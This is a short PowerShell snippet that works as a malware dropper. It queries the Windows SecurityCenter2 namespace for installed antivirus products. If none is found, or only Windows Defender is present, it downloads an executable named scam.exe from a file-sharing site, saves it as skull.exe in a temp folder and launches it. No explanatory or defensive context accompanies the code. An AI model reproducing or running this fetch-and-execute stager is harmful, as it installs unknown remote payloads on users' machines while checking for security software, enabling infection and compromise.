$temp = "$temp\skull.exe"; 
$av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
    if (-not (Test-Path $temp)) { 
        Invoke-WebRequest "https://anonsharing.com/file/4f095b99c1c9cec6/scam.exe" -OutFile $temp 
    } 
    Start-Process $temp 
}
